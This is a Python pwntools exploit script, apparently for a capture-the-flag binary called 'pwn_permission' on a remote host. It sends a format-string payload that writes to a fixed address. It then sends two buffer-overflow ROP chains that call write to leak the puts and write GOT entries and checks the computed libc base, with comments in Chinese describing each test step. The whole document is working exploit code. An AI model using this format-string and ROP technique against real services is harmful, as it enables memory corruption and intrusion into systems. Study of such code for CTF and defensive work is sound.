
from pwn import *
import time

context(arch='i386', os='linux', log_level='debug')

elf = ELF('pwn_permission')

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("vuln not triggered!")
    conn.close()
    exit(1)

log.success("vuln triggered!")

write_plt = elf.plt['write']
vuln_addr = elf.symbols['vuln']

# ====== 第一次ROP：调用write打印puts@GOT，返回vuln ======
payload = b'A' * 148
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(elf.got['puts'])
payload += p32(4)

log.info("Sending first ROP chain...")
conn.send(payload)
time.sleep(2)

response = conn.recv(timeout=5)
puts_leak = u32(response[:4])
log.info(f"puts: 0x{puts_leak:x}")

# ====== 现在程序应该回到了vuln ======
# vuln会再次调用read()读取我们的输入
# 让我发送一个简单的测试payload，只调用write打印一个已知字符串

# 用bss段中的已知字符串
# 实际上，让我直接打印GOT表中的另一个条目来验证

log.info("Sending second ROP chain (test write)...")
payload2 = b'B' * 148
payload2 += p32(write_plt)
payload2 += p32(vuln_addr)
payload2 += p32(1)
payload2 += p32(elf.got['write'])
payload2 += p32(4)

conn.send(payload2)
time.sleep(2)

try:
    response = conn.recv(timeout=5)
    write_leak = u32(response[:4])
    log.info(f"write: 0x{write_leak:x}")
    log.success("Second ROP chain works!")
    
    # 验证libc基址
    libc_base = puts_leak - 0x6d1e0
    write_expected = libc_base + 0x0f0820
    log.info(f"write expected: 0x{write_expected:x}")
    log.info(f"write actual: 0x{write_leak:x}")
    
    if write_leak == write_expected:
        log.success("Libc base calculation is CORRECT!")
    else:
        log.error("Libc base calculation is WRONG!")
    
except Exception as e:
    log.error(f"Second ROP chain failed: {e}")

conn.close()
